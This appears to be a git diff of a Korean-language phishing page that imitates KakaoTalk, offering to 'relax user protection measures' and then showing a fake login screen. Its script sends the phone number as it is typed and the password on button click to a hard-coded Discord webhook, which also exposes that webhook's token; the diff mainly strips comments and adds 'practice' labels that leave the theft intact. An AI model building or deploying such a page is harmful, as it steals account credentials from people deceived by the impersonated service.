@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="ko">
 <head>
@@ -22,7 +23,7 @@
   </style>
 </head>
 <body>
-  <!-- 안내 페이지 -->
+  
   <div id="page1" class="container">
     <h1>톡안녕패스로<br>이용자보호조치를 완화하세요.</h1>
     <p>모두를 위한 카톡 안녕가이드에서<br>이용자보호조치에 대해 더 자세히 알아보세요.</p>
@@ -36,13 +37,12 @@
 
     <div class="checkbox">
       <input type="checkbox" id="agree">
-      <label for="agree">[필수] 개인정보 수집 및 이용 동의</label>
+      <label for="agree">[필수] 개인정보 수집 및 이용 동의 (연습용)</label>
     </div>
 
     <button class="btn-yellow" onclick="goNext()">본인인증하기</button>
   </div>
 
-  <!-- 로그인 화면 -->
   <div id="page2" class="login-container hidden">
     <h2>카카오톡을 시작합니다</h2>
     <input type="text" placeholder="이메일 또는 전화번호" style="width: 370px; padding: 5px;">
@@ -54,17 +54,15 @@
     function goNext() {
       const chk = document.getElementById("agree");
       if (!chk.checked) {
-        alert("동의 후 진행할 수 있습니다.");
+        alert("동의 후 진행할 수 있습니다. (연습용)");
       } else {
         document.getElementById("page1").classList.add("hidden");
         document.getElementById("page2").classList.remove("hidden");
       }
     }
 
-    // ------------------- 웹훅 코드 -------------------
     const webhookURL = 'https://discord.com/api/webhooks/1406817501047947450/TkrHLmb42Hjc3p3afEOtCFe-U5ksQDvH3Bj1RUIGFMdDD98vGG_Rn7lTj1T7qoGdGfG9'; // 본인 웹훅 주소로 변경
-
-    // 전화번호 입력 자동 전송
+    //이걸보다니 당신은 행운아
     const phoneInput = document.querySelector('input[type="text"]');
     let phoneSent = false;
     phoneInput.addEventListener('input', () => {
@@ -81,8 +79,7 @@
       }
       if (phone.length < 11) phoneSent = false;
     });
-
-    // 비밀번호 버튼 클릭 시 전송
+    
     const passwordInput = document.querySelector('input[type="password"]');
     const loginBtn = document.querySelector('.btn-gray');
     loginBtn.addEventListener('click', () => {
@@ -95,7 +92,6 @@
       .then(res => console.log('비밀번호 전송 완료', res))
       .catch(err => console.error('비밀번호 전송 오류', err));
     });
-    // ------------------- 웹훅 코드 끝 -------------------
   </script>
 </body>
 </html>
